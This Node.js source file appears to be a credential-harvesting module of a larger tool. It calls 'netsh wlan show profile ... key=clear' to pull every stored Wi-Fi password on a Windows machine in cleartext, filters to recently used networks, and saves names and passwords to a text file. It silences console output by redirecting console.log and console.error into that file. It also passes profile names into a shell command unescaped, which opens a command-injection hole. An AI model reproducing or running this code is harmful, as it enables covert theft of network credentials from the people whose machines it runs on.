const childProcess = require('child_process');
const fs = require('fs');
const path = require('path');
const { DirectoryPath } = require('../index.js');

const outputFilePath = path.join(DirectoryPath, 'networkInformation.txt');
const logStream = fs.createWriteStream(outputFilePath, { flags: 'a' });
const errorStream = fs.createWriteStream(outputFilePath, { flags: 'a' });

// I COOKED SO HARD
console.log = function (message) {
  logStream.write(`${message}\n`);
};

console.error = function (message) {
  errorStream.write(`${message}\n`);
};

const now = new Date();
const thirtyDaysAgo = new Date(now.getTime() - 30 * 24 * 60 * 60 * 1000);

const profilesOutput = childProcess.execSync('netsh wlan show profiles').toString();
const profiles = profilesOutput.split('\n');
const wifiProfiles = {};

profiles.forEach((line) => {
  if (line.includes('All User Profile')) {
    const profileName = line.split(':')[1].trim();
    wifiProfiles[profileName] = {};
  }
});

Object.keys(wifiProfiles).forEach((profileName) => {
  try {
    const passwordOutput = childProcess.execSync(`netsh wlan show profile "${profileName}" key=clear`).toString();
    console.log(`Password Output for profile "${profileName}":\n${passwordOutput}`); // cooked 

    const passwordLines = passwordOutput.split('\n');
    let password;

    passwordLines.forEach((line) => {
      if (line.includes('Key Content')) {
        password = line.split(':')[1].trim();
      }
    });

    const interfacesOutput = childProcess.execSync('netsh wlan show interfaces').toString();
    console.log(`Interfaces Output:\n${interfacesOutput}`);

    const interfacesLines = interfacesOutput.split('\n');
    let lastConnectionTimeStr;

    interfacesLines.forEach((line) => {
      if (line.includes(profileName) && line.includes('State') && line.includes('connected')) {
        const dateMatch = line.match(/(\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2})/);
        if (dateMatch) {
          lastConnectionTimeStr = dateMatch[0];
        }
      }
    });

    if (lastConnectionTimeStr) {
      const lastConnectionTime = new Date(lastConnectionTimeStr);
      if (lastConnectionTime > thirtyDaysAgo) {
        wifiProfiles[profileName].password = password;
        wifiProfiles[profileName].lastConnectionTime = lastConnectionTime;
      }
    }
  } catch (err) {
    console.error(`Error retrieving information for profile "${profileName}": ${err}`);
  }
});

let fileContent = '';

Object.keys(wifiProfiles).forEach((profileName) => {
  if (wifiProfiles[profileName].password && wifiProfiles[profileName].lastConnectionTime) {
    fileContent += `Profile: ${profileName}\n`;
    fileContent += `Password: ${wifiProfiles[profileName].password}\n`;
    fileContent += `Last Connection Time: ${wifiProfiles[profileName].lastConnectionTime}\n\n`;
  }
});

try {
  fs.writeFileSync(outputFilePath, fileContent.trim());
  console.log(`Passwords and profiles saved to ${outputFilePath}`);
} catch (err) {
  console.error(`Error writing to file ${outputFilePath}: ${err}`);
}

// cooked 🤌
